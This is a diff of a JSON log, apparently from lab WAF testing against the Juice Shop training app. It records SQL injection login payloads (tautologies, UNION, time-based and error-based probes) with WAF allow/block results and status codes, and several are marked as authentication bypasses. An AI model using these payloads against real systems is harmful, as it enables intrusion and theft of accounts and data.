@@ -1,351 +1,6 @@
 [
     {
-        "ペイロード": "'",
-        "WAF": "Allowed",
-        "ステータスコード": 500
-    },
-    {
-        "ペイロード": "test@example.com",
-        "WAF": "Allowed",
-        "ステータスコード": 401
-    },
-    {
-        "ペイロード": "admin@juice-sh.op",
-        "WAF": "Allowed",
-        "ステータスコード": 401
-    },
-    {
-        "ペイロード": "invalid@mail.com'",
-        "WAF": "Blocked",
-        "ステータスコード": null
-    },
-    {
-        "ペイロード": "admin@juice-sh.op'--",
-        "WAF": "Blocked",
-        "ステータスコード": null
-    },
-    {
-        "ペイロード": "admin@juice-sh.op' OR 1=1 -- ",
-        "WAF": "Blocked",
-        "ステータスコード": null
-    },
-    {
-        "ペイロード": "testuser@example.com",
-        "WAF": "Allowed",
-        "ステータスコード": 401
-    },
-    {
-        "ペイロード": "invalid@domain.com",
-        "WAF": "Allowed",
-        "ステータスコード": 401
-    },
-    {
-        "ペイロード": "' OR 1=1-- ",
-        "WAF": "Blocked",
-        "ステータスコード": null
-    },
-    {
-        "ペイロード": "' UNION SELECT NULL, NULL, NULL-- ",
-        "WAF": "Blocked",
-        "ステータスコード": null
-    },
-    {
-        "ペイロード": "admin@juice-sh.op'--",
-        "WAF": "Blocked",
-        "ステータスコード": null
-    },
-    {
-        "ペイロード": "notfound@example.com",
-        "WAF": "Allowed",
-        "ステータスコード": 401
-    },
-    {
-        "ペイロード": "safeuser@domain.org",
-        "WAF": "Allowed",
-        "ステータスコード": 401
-    },
-    {
-        "ペイロード": "' OR 1=1--",
-        "WAF": "Allowed",
-        "ステータスコード": 200
-    },
-    {
-        "ペイロード": "admin'@'--",
-        "WAF": "Allowed",
-        "ステータスコード": 500
-    },
-    {
-        "ペイロード": "' UNION SELECT NULL, 'admin', 'password', NULL--",
-        "WAF": "Allowed",
-        "ステータスコード": 500
-    },
-    {
-        "ペイロード": "' OR 'a'='a",
-        "WAF": "Allowed",
-        "ステータスコード": 401
-    },
-    {
-        "ペイロード": "admin' --",
-        "WAF": "Allowed",
-        "ステータスコード": 401
-    },
-    {
-        "ペイロード": "user@example.com",
-        "WAF": "Allowed",
-        "ステータスコード": 401
-    },
-    {
-        "ペイロード": "invalid@test.com",
-        "WAF": "Allowed",
-        "ステータスコード": 401
-    },
-    {
-        "ペイロード": "someone@mail.com",
-        "WAF": "Allowed",
-        "ステータスコード": 401
-    },
-    {
-        "ペイロード": "' OR 1=1--",
-        "WAF": "Allowed",
-        "ステータスコード": 200
-    },
-    {
-        "ペイロード": "' OR 'a'='a",
-        "WAF": "Allowed",
-        "ステータスコード": 401
-    },
-    {
-        "ペイロード": "admin@juice-sh.op'--",
-        "WAF": "Allowed",
-        "ステータスコード": 200
-    },
-    {
-        "ペイロード": "' UNION SELECT NULL, 'admin@juice-sh.op', 'password'--",
-        "WAF": "Allowed",
-        "ステータスコード": 500
-    },
-    {
-        "ペイロード": "' OR 1=1 LIMIT 1--",
-        "WAF": "Allowed",
-        "ステータスコード": 200
-    },
-    {
-        "ペイロード": "test@example.com",
-        "WAF": "Allowed",
-        "ステータスコード": 401
-    },
-    {
-        "ペイロード": "invalid@example.org",
-        "WAF": "Allowed",
-        "ステータスコード": 401
-    },
-    {
-        "ペイロード": "' OR 1=1--",
-        "WAF": "Allowed",
-        "ステータスコード": 200
-    },
-    {
-        "ペイロード": "admin@juice-sh.op'--",
-        "WAF": "Allowed",
-        "ステータスコード": 200
-    },
-    {
-        "ペイロード": "' UNION SELECT 1, 'a', 'b', 'c'--",
-        "WAF": "Allowed",
-        "ステータスコード": 500
-    },
-    {
-        "ペイロード": "test@example.com",
-        "WAF": "Allowed",
-        "ステータスコード": 401
-    },
-    {
-        "ペイロード": "user@juice-sh.op",
-        "WAF": "Allowed",
-        "ステータスコード": 401
-    },
-    {
-        "ペイロード": "admin@juice-sh.op",
-        "WAF": "Allowed",
-        "ステータスコード": 401
-    },
-    {
-        "ペイロード": "' OR 1=1--",
-        "WAF": "Allowed",
-        "ステータスコード": 200
-    },
-    {
-        "ペイロード": "' OR '1'='1",
-        "WAF": "Allowed",
-        "ステータスコード": 401
-    },
-    {
-        "ペイロード": "' UNION SELECT null, null, null, null, null--",
-        "WAF": "Allowed",
-        "ステータスコード": 500
-    },
-    {
-        "ペイロード": "' OR true--",
-        "WAF": "Allowed",
-        "ステータスコード": 200
-    },
-    {
-        "ペイロード": "\" OR 1=1--",
-        "WAF": "Allowed",
-        "ステータスコード": 401
-    },
-    {
-        "ペイロード": "test@example.com",
-        "WAF": "Allowed",
-        "ステータスコード": 401
-    },
-    {
-        "ペイロード": "valid@email.org",
-        "WAF": "Allowed",
-        "ステータスコード": 401
-    },
-    {
-        "ペイロード": "' OR 1=1--",
-        "WAF": "Allowed",
-        "ステータスコード": 200
-    },
-    {
-        "ペイロード": "admin@juice-sh.op'--",
-        "WAF": "Allowed",
-        "ステータスコード": 200
-    },
-    {
-        "ペイロード": "' UNION SELECT null, null, null--",
-        "WAF": "Allowed",
-        "ステータスコード": 500
-    },
-    {
-        "ペイロード": "test@example.com",
-        "WAF": "Allowed",
-        "ステータスコード": 401
-    },
-    {
-        "ペイロード": "user@domain.com",
-        "WAF": "Allowed",
-        "ステータスコード": 401
-    },
-    {
-        "ペイロード": "' OR 1=1--",
-        "WAF": "Allowed",
-        "ステータスコード": 200
-    },
-    {
-        "ペイロード": "' OR '1'='1",
-        "WAF": "Allowed",
-        "ステータスコード": 401
-    },
-    {
-        "ペイロード": "admin@juice-sh.op'--",
-        "WAF": "Allowed",
-        "ステータスコード": 200
-    },
-    {
-        "ペイロード": "' UNION SELECT NULL, NULL, NULL, NULL, NULL--",
-        "WAF": "Allowed",
-        "ステータスコード": 500
-    },
-    {
-        "ペイロード": "' OR 1=1 LIMIT 1--",
-        "WAF": "Allowed",
-        "ステータスコード": 200
-    },
-    {
-        "ペイロード": "innocent@example.com",
-        "WAF": "Allowed",
-        "ステータスコード": 401
-    },
-    {
-        "ペイロード": "safemail@test.org",
-        "WAF": "Allowed",
-        "ステータスコード": 401
-    },
-    {
-        "ペイロード": "' OR 1=1--",
-        "WAF": "Blocked",
-        "ステータスコード": 403
-    },
-    {
-        "ペイロード": "' OR '1'='1'--",
-        "WAF": "Allowed",
-        "ステータスコード": 200
-    },
-    {
-        "ペイロード": "admin@juice-sh.op'--",
-        "WAF": "Blocked",
-        "ステータスコード": 403
-    },
-    {
-        "ペイロード": "test@example.com",
-        "WAF": "Allowed",
-        "ステータスコード": 401
-    },
-    {
-        "ペイロード": "user@juice-sh.op",
-        "WAF": "Allowed",
-        "ステータスコード": 401
-    },
-    {
-        "ペイロード": "' OR 1=1--",
-        "WAF": "Blocked",
-        "ステータスコード": 403
-    },
-    {
-        "ペイロード": "admin@juice-sh.op'--",
-        "WAF": "Blocked",
-        "ステータスコード": 403
-    },
-    {
-        "ペイロード": "' OR '1'='1--",
-        "WAF": "Allowed",
-        "ステータスコード": 401
-    },
-    {
-        "ペイロード": "' OR 1=1 LIMIT 1--",
-        "WAF": "Allowed",
-        "ステータスコード": 200
-    },
-    {
-        "ペイロード": "' OR 1=1 /*",
-        "WAF": "Allowed",
-        "ステータスコード": 200
-    },
-    {
-        "ペイロード": "test@example.com",
-        "WAF": "Allowed",
-        "ステータスコード": 401
-    },
-    {
-        "ペイロード": "user@juice-shop.com",
-        "WAF": "Allowed",
-        "ステータスコード": 401
-    },
-    {
-        "ペイロード": "' OR 1=1-- ",
-        "WAF": "Blocked",
-        "ステータスコード": 403
-    },
-    {
-        "ペイロード": "' OR 1=1 LIMIT 1-- ",
-        "WAF": "Blocked",
-        "ステータスコード": 403
-    },
-    {
-        "ペイロード": "admin@juice-shop.com'-- ",
-        "WAF": "Allowed",
-        "ステータスコード": 401
-    },
-    {
-        "ペイロード": "' OR 1=1--",
-        "WAF": "Blocked",
-        "ステータスコード": 403
-    },
-    {
-        "ペイロード": "' OR 'a'='a",
+        "ペイロード": "admin' OR '1'='1",
         "WAF": "Allowed",
         "ステータスコード": 401
     },
@@ -355,104 +10,14 @@
         "ステータスコード": 401
     },
     {
-        "ペイロード": "' UNION SELECT NULL,NULL,NULL--",
-        "WAF": "Allowed",
-        "ステータスコード": 500
-    },
-    {
-        "ペイロード": "' OR 1=1 LIMIT 1--",
-        "WAF": "Blocked",
-        "ステータスコード": 403
-    },
-    {
-        "ペイロード": "' UNION SELECT id, email, password FROM users WHERE role='admin'--",
-        "WAF": "Allowed",
-        "ステータスコード": 500
-    },
-    {
-        "ペイロード": "' OR 'a'='a--",
+        "ペイロード": "admin';SELECT SLEEP(5)--",
         "WAF": "Allowed",
         "ステータスコード": 401
     },
     {
-        "ペイロード": "' OR 2>1--",
-        "WAF": "Allowed",
-        "ステータスコード": 200
-    },
-    {
-        "ペイロード": "admin@juice-sh.op'--",
-        "WAF": "Blocked",
-        "ステータスコード": 403
-    },
-    {
-        "ペイロード": "' AND (SELECT @@version)--",
-        "WAF": "Allowed",
-        "ステータスコード": 500
-    },
-    {
-        "ペイロード": "' OR 1=1-- ",
-        "WAF": "Blocked",
-        "ステータスコード": 403
-    },
-    {
-        "ペイロード": "' OR 'a'='a",
+        "ペイロード": "admin';WAITFOR DELAY '00:00:05'--",
         "WAF": "Allowed",
         "ステータスコード": 401
-    },
-    {
-        "ペイロード": "admin@juice-sh.op'-- ",
-        "WAF": "Blocked",
-        "ステータスコード": 403
-    },
-    {
-        "ペイロード": "' AND 1=CAST((SELECT SQLITE_VERSION()) AS INT)-- ",
-        "WAF": "Allowed",
-        "ステータスコード": 401
-    },
-    {
-        "ペイロード": "' AND 1=IF(SUBSTR(SQLITE_VERSION(),1,1)='3',SLEEP(5),0)-- ",
-        "WAF": "Allowed",
-        "ステータスコード": 500
-    },
-    {
-        "ペイロード": {
-            "ペイロード": "' OR 1=1"
-        },
-        "WAF": "Allowed",
-        "ステータスコード": 401
-    },
-    {
-        "ペイロード": {
-            "ペイロード": "' OR 1=1 /*"
-        },
-        "WAF": "Allowed",
-        "ステータスコード": 401
-    },
-    {
-        "ペイロード": {
-            "ペイロード": "' AND IF(SQLITE_VERSION() LIKE '3.%', SLEEP(5), 0)"
-        },
-        "WAF": "Allowed",
-        "ステータスコード": 401
-    },
-    {
-        "ペイロード": {
-            "ペイロード": "' AND (SELECT 1 FROM sqlite_master WHERE 1=CAST((SELECT name FROM sqlite_master LIMIT 1) AS INT))"
-        },
-        "WAF": "Allowed",
-        "ステータスコード": 401
-    },
-    {
-        "ペイロード": {
-            "ペイロード": "admin@juice-sh.op' AND 1=1"
-        },
-        "WAF": "Allowed",
-        "ステータスコード": 401
-    },
-    {
-        "ペイロード": "' OR 1=1--",
-        "WAF": "Blocked",
-        "ステータスコード": 403
     },
     {
         "ペイロード": "' OR '1'='1",
@@ -460,143 +25,399 @@
         "ステータスコード": 401
     },
     {
-        "ペイロード": "admin@juice-sh.op'--",
-        "WAF": "Blocked",
-        "ステータスコード": 403
-    },
-    {
-        "ペイロード": "' OR 1=1 LIMIT 1--",
-        "WAF": "Blocked",
-        "ステータスコード": 403
-    },
-    {
-        "ペイロード": "')--",
-        "WAF": "Allowed",
-        "ステータスコード": 500
-    },
-    {
-        "ペイロード": "' OR 'a'='a",
-        "WAF": "Allowed",
-        "ステータスコード": 401
-    },
-    {
-        "ペイロード": "admin@juice-sh.op' OR '1'='1",
-        "WAF": "Allowed",
-        "ステータスコード": 200
-    },
-    {
-        "ペイロード": "' OR 1=1/*",
-        "WAF": "Allowed",
-        "ステータスコード": 200
-    },
-    {
-        "ペイロード": "') OR '1'='1",
-        "WAF": "Allowed",
-        "ステータスコード": 500
-    },
-    {
-        "ペイロード": "admin@juice-sh.op' UNION SELECT 1, 'admin@juice-sh.op', 'dummyhash', 'admin'/*",
-        "WAF": "Allowed",
-        "ステータスコード": 500
-    },
-    {
-        "ペイロード": "test@example.com",
-        "WAF": "Allowed",
-        "ステータスコード": 401
-    },
-    {
-        "ペイロード": "user@domain.com",
-        "WAF": "Allowed",
-        "ステータスコード": 401
-    },
-    {
-        "ペイロード": "' OR 1=1--",
-        "WAF": "Allowed",
-        "ステータスコード": 200
-    },
-    {
-        "ペイロード": "' OR 'a'='a",
-        "WAF": "Allowed",
-        "ステータスコード": 401
-    },
-    {
-        "ペイロード": "admin@juice-sh.op'--",
-        "WAF": "Allowed",
-        "ステータスコード": 200
-    },
-    {
-        "ペイロード": "dummy@example.com",
-        "WAF": "Allowed",
-        "ステータスコード": 401
-    },
-    {
-        "ペイロード": "notfound@domain.net",
-        "WAF": "Allowed",
-        "ステータスコード": 401
-    },
-    {
-        "ペイロード": "' OR 1=1--",
-        "WAF": "Allowed",
-        "ステータスコード": 200
-    },
-    {
-        "ペイロード": "admin@juice-sh.op'--",
-        "WAF": "Allowed",
-        "ステータスコード": 200
-    },
-    {
-        "ペイロード": "a' OR '1'='1'--",
-        "WAF": "Allowed",
-        "ステータスコード": 200
-    },
-    {
         "ペイロード": "' OR '1'='1",
         "WAF": "Allowed",
         "ステータスコード": 401
     },
     {
-        "ペイロード": "' OR '1'='1' -- ",
+        "ペイロード": "' OR 'a'='a",
+        "WAF": "Allowed",
+        "ステータスコード": 401
+    },
+    {
+        "ペイロード": "') OR ('1'='1",
+        "WAF": "Allowed",
+        "ステータスコード": 500
+    },
+    {
+        "ペイロード": "') OR 'a'='a",
+        "WAF": "Allowed",
+        "ステータスコード": 500
+    },
+    {
+        "ペイロード": "') OR ('a'='a",
+        "WAF": "Allowed",
+        "ステータスコード": 500
+    },
+    {
+        "ペイロード": "' OR '1'='1",
+        "スコア": 10,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 401
+    },
+    {
+        "ペイロード": "' OR '1'='1",
+        "スコア": 10,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 401
+    },
+    {
+        "ペイロード": "' OR '1'='1",
+        "スコア": 10,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 401
+    },
+    {
+        "ペイロード": "' OR '1'='1",
+        "スコア": 10,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 401
+    },
+    {
+        "ペイロード": "' OR '1'='1",
+        "スコア": 10,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 401
+    },
+    {
+        "ペイロード": "1' OR '1'='1",
+        "スコア": 10,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 401
+    },
+    {
+        "ペイロード": "' OR SLEEP(10)--",
+        "スコア": 10,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 500
+    },
+    {
+        "ペイロード": "' OR 1=1--",
+        "スコア": 10,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 200
+    },
+    {
+        "ペイロード": "' OR 1=(SELECT * FROM users WHERE email='{user_email}';)",
+        "スコア": 10,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 500
+    },
+    {
+        "ペイロード": "' OR EXISTS(SELECT * FROM users WHERE email='{user_email}') --",
+        "スコア": 10,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 401
+    },
+    {
+        "ペイロード": "' OR '1'='1",
+        "スコア": 10,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 401
+    },
+    {
+        "ペイロード": "' OR SLEEP(10)--",
+        "スコア": 10,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 500
+    },
+    {
+        "ペイロード": "' OR 1=(SELECT * FROM users WHERE email='{user_email}';)",
+        "スコア": 10,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 500
+    },
+    {
+        "ペイロード": "' OR 1=CAST('true' AS boolean) -- ",
+        "スコア": 10,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 401
+    },
+    {
+        "ペイロード": "' OR 1=CONCAT(0x5f6b6579,0x74657374)",
+        "スコア": 10,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 500
+    },
+    {
+        "ペイロード": "' OR 1=1",
+        "スコア": 10,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 500
+    },
+    {
+        "ペイロード": "' OR '1'='1",
+        "スコア": 10,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 401
+    },
+    {
+        "ペイロード": "' OR ''=''",
+        "スコア": 10,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 500
+    },
+    {
+        "ペイロード": "' OR null=null",
+        "スコア": 10,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 500
+    },
+    {
+        "ペイロード": "' OR 1=0",
+        "スコア": 10,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 500
+    },
+    {
+        "ペイロード": "' OR '1'='1",
+        "スコア": 10,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 401
+    },
+    {
+        "ペイロード": "' OR '1'='1; --",
+        "スコア": 10,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 401
+    },
+    {
+        "ペイロード": "' OR '1'='1 /*",
+        "スコア": 10,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 401
+    },
+    {
+        "ペイロード": "admin' --",
+        "スコア": 10,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 401
+    },
+    {
+        "ペイロード": "' OR '1'='1 #",
+        "スコア": 10,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 401
+    },
+    {
+        "ペイロード": "' OR '1'='1",
+        "スコア": 10,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 401
+    },
+    {
+        "ペイロード": "' OR ''='' AND (SELECT COUNT(*) FROM users) >= 10000000 -- ",
+        "スコア": 10,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 401
+    },
+    {
+        "ペイロード": "') OR (SELECT count(*) from users) > 2000000 --",
+        "スコア": 10,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 500
+    },
+    {
+        "ペイロード": "') OR (select count(*) from users) > 3000000 --",
+        "スコア": 10,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 500
+    },
+    {
+        "ペイロード": "') OR (select count(*) from users) > 4000000 --",
+        "スコア": 10,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 500
+    },
+    {
+        "ペイロード": "') OR (SELECT count(*) from users) > 2000000 --",
+        "スコア": 10,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 500
+    },
+    {
+        "ペイロード": "') OR (select count(*) from users) > 3000000 --",
+        "スコア": 10,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 500
+    },
+    {
+        "ペイロード": "') OR (select count(*) from users) > 4000000 --",
+        "スコア": 10,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 500
+    },
+    {
+        "ペイロード": "admin' OR '1'='1",
+        "スコア": 10,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 401
+    },
+    {
+        "ペイロード": "' OR 1=1;--",
+        "スコア": 10,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 200
+    },
+    {
+        "ペイロード": "' OR '1'='1",
+        "スコア": 10,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 401
+    },
+    {
+        "ペイロード": "' OR '1'='1'; --",
+        "スコア": 10,
+        "アラートレベル": "low-level",
         "WAF": "Allowed",
         "ステータスコード": 200
     },
     {
         "ペイロード": "' OR '1'='1' /*",
+        "スコア": 10,
+        "アラートレベル": "low-level",
         "WAF": "Allowed",
         "ステータスコード": 200
     },
     {
-        "ペイロード": "' OR '1'='1' # ",
+        "ペイロード": "SELECT * FROM users WHERE email = 'admin'--",
+        "スコア": 10,
+        "アラートレベル": "low-level",
         "WAF": "Allowed",
         "ステータスコード": 500
     },
     {
-        "ペイロード": "' OR '1'='1' ; ",
-        "WAF": "Allowed",
-        "ステータスコード": 200
-    },
-    {
-        "ペイロード": "' OR '1'='1'",
+        "ペイロード": "SELECT * FROM users WHERE email = 'admin';--",
+        "スコア": 10,
+        "アラートレベル": "low-level",
         "WAF": "Allowed",
         "ステータスコード": 500
     },
     {
-        "ペイロード": "' OR '1'='1' -- ",
+        "ペイロード": "' OR ''='",
+        "スコア": 10,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 401
+    },
+    {
+        "ペイロード": "; SELECT * FROM users WHERE email = 'admin'",
+        "スコア": 10,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 500
+    },
+    {
+        "ペイロード": "' OR '1'='1",
+        "スコア": 10,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 401
+    },
+    {
+        "ペイロード": "' OR '1'='1",
+        "スコア": 10,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 401
+    },
+    {
+        "ペイロード": "' OR '1'='1' --",
+        "スコア": 10,
+        "アラートレベル": "low-level",
         "WAF": "Allowed",
         "ステータスコード": 200
     },
     {
         "ペイロード": "' OR '1'='1' /*",
+        "スコア": 10,
+        "アラートレベル": "low-level",
         "WAF": "Allowed",
         "ステータスコード": 200
     },
     {
-        "ペイロード": "' OR '1'='1' # ",
+        "ペイロード": "' OR '1'='1' /*--",
+        "スコア": 10,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 200
+    },
+    {
+        "ペイロード": "' OR '1'='1' #",
+        "スコア": 10,
+        "アラートレベル": "low-level",
         "WAF": "Allowed",
         "ステータスコード": 500
     },
     {
-        "ペイロード": "' OR '1'='1' ; ",
+        "ペイロード": "' OR '1'='1",
+        "スコア": 10,
+        "アラートレベル": "low-level",
         "WAF": "Allowed",
-        "ステータスコード": 200
+        "ステータスコード": 401
+    },
+    {
+        "ペイロード": "' OR 1=1 #",
+        "スコア": 10,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 500
+    },
+    {
+        "ペイロード": "' OR true && false #",
+        "スコア": 10,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 500
+    },
+    {
+        "ペイロード": "') OR '1'='1 #",
+        "スコア": 10,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 500
+    },
+    {
+        "ペイロード": "' OR (SELECT * FROM information_schema.columns) AND '1'='1",
+        "スコア": 10,
+        "アラートレベル": "low-level",
+        "WAF": "Allowed",
+        "ステータスコード": 500
     }
 ]
